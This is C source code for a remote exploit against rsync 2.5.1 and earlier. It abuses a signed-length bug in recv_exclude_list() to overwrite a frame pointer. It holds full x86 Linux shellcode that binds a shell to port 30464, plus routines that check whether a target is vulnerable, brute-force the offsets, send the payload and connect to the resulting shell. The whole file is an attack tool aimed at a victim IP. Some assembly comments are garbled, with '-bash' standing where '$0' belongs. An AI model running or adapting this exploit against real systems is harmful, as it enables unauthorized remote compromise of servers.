/*
 * linux rsync <= 2.5.1 remote exploit by sorbo (sorbox@yahoo.com)
 *
 * this is a simple frame pointer overflow:
 *
 * in exclude.c in recv_exclude_list(), l is declared as int.
 * we can pass a negative value for l and fool l >= MAXPATHLEN
 * read_sbuf will in turn do a buf[len] = 0; (without performing any reads)
 * we can modify read_sbuf's saved frame pointer by putting a 0 in the LSB.
 * When read_sbuf exits the stack pointer will be set to the modified value
 * we then pop a return address that lies on line[] where we can make it point to our shellcode
 * ... quite simple =D
 *
 * NOTE: in configuration chroot must be false
 *
 * running: ./sorsync -b -v 127.0.0.1
 * should work on any linux =D
 *
 *
 * greetz:
 * #darkircop@undernet
 * kewlcat@efnet (for telling me about the bug)
 * gunzip@ircnet (moral support =P )
 *
 */


#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>      
#include <arpa/inet.h>



#define MAXPATHLEN 4095

int nopcount = 80;

char shellcode[] =
/* port bind tcp/30464 ***/
/* fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) */
"\x31\xc0"                      // xorl    %eax,%eax
"\x31\xdb"                      // xorl    %ebx,%ebx
"\x31\xc9"                      // xorl    %ecx,%ecx
"\x31\xd2"                      // xorl    %edx,%edx
"\xb0\x66"                      // movb    -bashx66,%al
"\xb3\x01"                      // movb    -bashx1,%bl
"\x51"                          // pushl   %ecx
"\xb1\x06"                      // movb    -bashx6,%cl
"\x51"                          // pushl   %ecx
"\xb1\x01"                      // movb    -bashx1,%cl
"\x51"                          // pushl   %ecx
"\xb1\x02"                      // movb    -bashx2,%cl
"\x51"                          // pushl   %ecx
"\x8d\x0c\x24"                  // leal    (%esp),%ecx
"\xcd\x80"                      // int     -bashx80

/* port is 30464 !!! */
/* bind(fd, (struct sockaddr)&sin,  sizeof(sin) ) */
"\xb3\x02"                      // movb    -bashx2,%bl
"\xb1\x02"                      // movb    -bashx2,%cl
"\x31\xc9"                      // xorl    %ecx,%ecx
"\x51"                          // pushl   %ecx
"\x51"                          // pushl   %ecx
"\x51"                          // pushl   %ecx
/* port = 0x77, change if needed */
"\x80\xc1\x77"                  // addb    -bashx77,%cl
"\x66\x51"                      // pushl   %cx
"\xb1\x02"                      // movb    -bashx2,%cl
"\x66\x51"                      // pushw   %cx
"\x8d\x0c\x24"                  // leal    (%esp),%ecx
"\xb2\x10"                      // movb    -bashx10,%dl
"\x52"                          // pushl   %edx
"\x51"                          // pushl   %ecx
"\x50"                          // pushl   %eax
"\x8d\x0c\x24"                  // leal    (%esp),%ecx
"\x89\xc2"                      // movl    %eax,%edx
"\x31\xc0"                      // xorl    %eax,%eax
"\xb0\x66"                      // movb    -bashx66,%al
"\xcd\x80"                      // int     -bashx80

/* listen(fd, 1) */
"\xb3\x01"                      // movb    -bashx1,%bl
"\x53"                          // pushl   %ebx
"\x52"                          // pushl   %edx
"\x8d\x0c\x24"                  // leal    (%esp),%ecx
"\x31\xc0"                      // xorl    %eax,%eax
"\xb0\x66"                      // movb    -bashx66,%al
"\x80\xc3\x03"                  // addb    -bashx3,%bl
"\xcd\x80"                      // int     -bashx80

/* cli = accept(fd, 0, 0) */
"\x31\xc0"                      // xorl    %eax,%eax
"\x50"                          // pushl   %eax
"\x50"                          // pushl   %eax
"\x52"                          // pushl   %edx
"\x8d\x0c\x24"                  // leal    (%esp),%ecx
"\xb3\x05"                      // movl    -bashx5,%bl
"\xb0\x66"                      // movl    -bashx66,%al
"\xcd\x80"                      // int     -bashx80

/* dup2(cli, 0) */
"\x89\xc3"                      // movl    %eax,%ebx
"\x31\xc9"                      // xorl    %ecx,%ecx
"\x31\xc0"                      // xorl    %eax,%eax
"\xb0\x3f"                      // movb    -bashx3f,%al
"\xcd\x80"                      // int     -bashx80

/* dup2(cli, 1) */
"\x41"                          // inc     %ecx
"\x31\xc0"                      // xorl    %eax,%eax
"\xb0\x3f"                      // movl    -bashx3f,%al
"\xcd\x80"                      // int     -bashx80

/* dup2(cli, 2) */
"\x41"                          // inc     %ecx
"\x31\xc0"                      // xorl    %eax,%eax
"\xb0\x3f"                      // movb    -bashx3f,%al
"\xcd\x80"                      // int     -bashx80

/* execve("//bin/sh", ["//bin/sh", NULL], NULL); */
"\x31\xdb"                      // xorl    %ebx,%ebx
"\x53"                          // pushl   %ebx
"\x68\x6e\x2f\x73\x68"          // pushl   -bashx68732f6e
"\x68\x2f\x2f\x62\x69"          // pushl   -bashx69622f2f
"\x89\xe3"                      // movl    %esp,%ebx
"\x8d\x54\x24\x08"              // leal    0x8(%esp),%edx
"\x31\xc9"                      // xorl    %ecx,%ecx
"\x51"                          // pushl   %ecx
"\x53"                          // pushl   %ebx
"\x8d\x0c\x24"                  // leal    (%esp),%ecx
"\x31\xc0"                      // xorl    %eax,%eax
"\xb0\x0b"                      // movb    -bashxb,%al
"\xcd\x80"                      // int     -bashx80

/* exit(%ebx) */
"\x31\xc0"                      // xorl    %eax,%eax
"\xb0\x01"                      // movb    -bashx1,%al
"\xcd\x80";                     // int     -bashx80

struct sockaddr_in s_in;
char module[256];/* module to use */


void die(int p, char *m) {
        if(p)
                perror(m);
        else
                printf("%s\n",m);
        exit(0);
}


/* check if data is avaliable to be read */
int checkData(int s) {
int rd;
        fd_set rfds;
        struct timeval tv;
               
FD_ZERO(&rfds);
FD_SET(s, &rfds);

tv.tv_sec = 5;
tv.tv_usec = 0;

                     
rd = select(s+1,&rfds,NULL,NULL,&tv);
if(rd < 0)
die(1,"select()");
return rd;
}


/* get data from server with timeout */
void get(int s) {
        char buff[1024];
        int rd;

while(1) {
rd = checkData(s);
if(rd == 0)
return;

        rd = recv(s,buff,sizeof(buff),0);
if(!rd)
return;

        if(rd == -1)
                die(1,"recv()");
        }
}


/*
 * connects, gets version string and replies with same version
 *
 */
int connect_and_version() {
int rd;
char buff[80];

int s = socket(PF_INET,SOCK_STREAM,IPPROTO_TCP);
if(s < 0)
die(1,"socket()");

if(connect(s,(struct sockaddr*)&s_in,sizeof(s_in)) < 0)
die(1,"connect()");


/* get version and send same ver */
if( (rd = recv(s,buff,sizeof(buff),0)) < 1)
die(1,"recv()");
send(s,buff,rd,0);

return s;
}

/* send module and other stuff untill we arrive to recv_exclude_list() */
void login(int s) {
char buff[80];

/* send module name */
snprintf(buff,sizeof(buff),"%s\n",module);
send(s,buff,strlen(buff),0);

/* send stuff to get to recv_exclude_list() */
        send(s,"--server\n",9,0);
        send(s,"--sender\n",9,0);
        send(s,"\n",1,0);
                       
}

/* try to connect to the shell */
void ride() {
        fd_set rfds;
        int rd;
int s;
struct sockaddr_in s_in2;
char buff[1024];

memcpy(&s_in2,&s_in,sizeof(s_in2));
s_in2.sin_port = htons(30464);

s = socket(PF_INET,SOCK_STREAM,IPPROTO_TCP);
if(s < 0)
die(1,"socket()");

if(connect(s,(struct sockaddr *)&s_in2,sizeof(s_in2)) < 0) {
close(s);
return;/* failed */
}


/* successs */
        send(s,"id;\n",4,0);

        while(1) {
               FD_ZERO(&rfds);
                FD_SET(0, &rfds);
                FD_SET(s, &rfds);

                if(select(s+1, &rfds, NULL, NULL, NULL) < 1)
                        exit(0);

                if(FD_ISSET(0,&rfds)) {
                        if( (rd = read(0,buff,sizeof(buff))) < 1)
                                exit(0);
                        if( send(s,buff,rd,0) != rd)
                                exit(0);

                }
                if(FD_ISSET(s,&rfds)) {
                        if( (rd = recv(s,buff,sizeof(buff),0)) < 1)
                                exit(0);
                        write(1,buff,rd);
                }
        }
}


/* do the actual overflow
 *
 * len is the len that makes line[len] point to read_sbuf's LSB of the saved FP
 * line is the address of the line buffer
 *
 */
void doOverflow(int len, int line,int align) {
int s,rd;
int *ptr;
char buff[MAXPATHLEN];

s = connect_and_version();
login(s);

printf("Trying with len=%d and line=0x%x (shellcode=0x%x) align=%d\n",len,line,line+abs(len),align);

memset(buff,'A',align);

/* prepare egg and send it */
for(ptr = (int*) (&buff[0]+align); (char*)ptr < ((char*)&buff[MAXPATHLEN]-3); ptr++)
*ptr =  (line+abs(len));
memset(buff+abs(len),'\x90',nopcount);
memcpy(buff+abs(len)+nopcount,shellcode,strlen(shellcode));/* possible overflow ;D */

/* prepare and send length */
rd = MAXPATHLEN -1;
send(s,&rd,sizeof(rd),0);

/* send egg */
send(s,buff,rd,0);


/* send len (overwrite fp */
send(s,&len,sizeof(len),0);


/* make recv_exclude_list() exit */
rd = 0;
send(s,&rd,sizeof(rd),0);


/* recieve any data from server and close */
get(s);

close(s);

/* check if exploitation was successfull */
ride();
}


/* gets a module name */
void getModule() {
int s,rd;
char mod[256];
char *ptr;

/* connect and get initial data */
s = connect_and_version();
get(s);

/* list and get modules */
send(s,"#list\n",6,0);
rd = recv(s,mod,sizeof(mod),0);
if(rd < 1)
die(1,"recv()");

mod[rd] = 0;
ptr = (char*)strchr(mod,' ');
if(!ptr)
return;
*ptr = 0;

snprintf(module,sizeof(module),"%s",mod);
if(module[0] == '@')
die(0,"No modules!!!");

close(s);
}

void usage(char *p) {
printf("Linux rsync <= 2.5.1 remote exploit by sorbo (sorbox@yahoo.com)\n");
printf("Usage: %s <opts>\n",p);

printf("-h this lame message\n");
printf("-v victim ip\n");
printf("-m module name\n");
printf("-l len\n");
printf("-s line address\n");
printf("-b bruteforce\n");
printf("-f force:don't check vuln\n");
printf("-n number of NOPS\n");
printf("-a align\n");
exit(0);
}


/* check if vuln */
int checkVuln() {
int s,rd;
               
s = connect_and_version();
login(s);
get(s);

/* check for overflow */
rd = -1;
send(s,&rd,sizeof(rd),0);

/* now it either sends an overflow message
 * (thus being not vuln )
 * or it waits for input ... vuln
 */
if(!checkData(s))
return 1;

close(s);
return 0;
}



/* gets len variable
 * it does so by seeing where ret addr of read_sbuf is
 * it knows it overwrote the addr because the program will crash
 * the fp will therefore be a word lower than the ret addr
 *
 */
int getLen(int len) {
int s;
               
s = connect_and_version();
login(s);
get(s);

while(1)  {
printf("Trying len %d...\n",len);
send(s,&len,sizeof(len),0);
if(checkData(s)) {
close(s);
return len-4;
}
len-=4;
}
}


int main(int argc, char *argv[]) {
int opt;
int m = 0;
int len = -4;
int line = 0xC0000000;
int check = 1;
int brute = 0;/* bruteforce ;D */
int l = 1;
int align = 0;

        if(argc < 2)
        usage(argv[0]);

while( (opt = getopt(argc,argv,"v:hm:l:s:bfn:a:")) != -1) {
switch(opt) {
case 'v':
s_in.sin_addr.s_addr = inet_addr(optarg);
break;

case 'm':
snprintf(module,sizeof(module),"%s",optarg);
m++;
break;

case 'l':
l = 0;
len = atoi(optarg);
break;

case 's':
if(sscanf(optarg,"%x",&line) == -1) {
printf("Invalid line address\n");
exit(0);
}
break;

case 'b':
brute = 1;
break;

case 'f':
check = 0;
break;

case 'n':
nopcount = atoi(optarg);
break;


case 'a':
align = atoi(optarg);
break;

case 'h':
default:
usage(argv[0]);
}
}
                       
s_in.sin_family = PF_INET;
s_in.sin_port = htons(873);


if(!m) {
printf("Getting module name...\n");
getModule();
printf("Module=%s\n",module);
}

if(check) {
printf("Checking if vuln...\n");
if(checkVuln())
printf("Vuln!!\n");
else {
printf("Not vuln =(\n");
exit(0);
}
}

if(l) {
len = getLen(len);
printf("len=%d\n",len);
}

if(brute) {
while(1) {
doOverflow(len,line,align);
line -= (nopcount-1);
}
}

doOverflow(len,line,align);
exit(0);
}
